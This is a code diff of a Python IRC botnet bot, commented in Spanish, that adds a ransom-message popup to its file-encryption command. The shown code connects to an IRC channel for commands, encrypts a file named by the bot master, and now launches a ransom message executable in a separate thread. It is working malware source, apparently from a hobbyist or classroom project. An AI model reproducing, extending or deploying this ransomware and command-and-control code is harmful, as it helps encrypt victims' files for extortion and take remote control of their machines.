@@ -4,6 +4,7 @@ from Crypto.Hash import SHA256
 from Crypto.PublicKey import RSA
 from Crypto import Random
 from subprocess import Popen, PIPE, CalledProcessError
+import threading
  
 servidor = "192.168.1.30"
 canal = "#DianaOscar"
@@ -125,6 +126,9 @@ def isBotMaster(passwd):
             
     return True 
 
+def show_ransom_msg(fileName):
+    sub_stdout, sub_stderr = Popen(["C:\Users\malware\Documents\Scana\dist\msg.exe", fileName], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
+
 def do_command(irc, ircmsg):
     '''
         Funcion que implementa todos los comandos disponibles para el Bot
@@ -173,7 +177,7 @@ def do_command(irc, ircmsg):
             send_msg(irc, canal, "Cifrando...")
             fileA=command_rec
             if os.path.exists(fileA):
-                #sub_stdout, sub_stderr = Popen(["C:\Users\malware\Documents\Scana\message.exe"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
+                threading.Thread(target=show_ransom_msg, args=(fileA,)).start()
                 llave = CreaLlave('hola')
                 Cifra(llave,fileA)
                 mensaje = "Cifrado exitoso!"
